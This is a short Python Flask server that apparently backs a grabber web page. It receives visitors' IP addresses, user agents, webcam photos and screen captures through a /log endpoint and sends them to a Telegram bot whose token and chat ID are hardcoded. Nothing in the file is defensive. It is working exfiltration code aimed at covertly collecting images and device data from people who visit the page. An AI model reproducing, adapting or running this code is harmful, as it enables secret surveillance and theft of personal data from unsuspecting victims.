import requests
import base64
from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

BOT_TOKEN = "8820194857:AAEcT1qBpODtvkUK58MfJT77_U9iVRplapg"
CHAT_ID = "912559442"

def send_tg(text, photo_bytes=None):
    try:
        if photo_bytes:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            files = {"photo": ("shot.jpg", photo_bytes, "image/jpeg")}
            data = {"chat_id": CHAT_ID, "caption": text[:200]}
            requests.post(url, data=data, files=files, timeout=10)
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=5)
    except:
        pass

@app.route("/")
def index():
    return open("index.html", encoding="utf-8").read()

@app.route("/log", methods=["POST"])
def log():
    data = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    msg = f"<b>🎯 Лог от {ip}</b>\n🕒 {datetime.now()}\n📱 {ua[:80]}\n\n"
    for k, v in data.items():
        if k in ["screenshot_base64", "screen_capture_base64"]:
            continue
        msg += f"<b>{k}</b>: {str(v)[:150]}\n"
    send_tg(msg)
    
    if "screenshot_base64" in data and data["screenshot_base64"]:
        img = base64.b64decode(data["screenshot_base64"])
        send_tg("📸 Фото с камеры", photo_bytes=img)
    
    if "screen_capture_base64" in data and data["screen_capture_base64"]:
        img2 = base64.b64decode(data["screen_capture_base64"])
        send_tg("🖥️ Скриншот экрана", photo_bytes=img2)
    
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
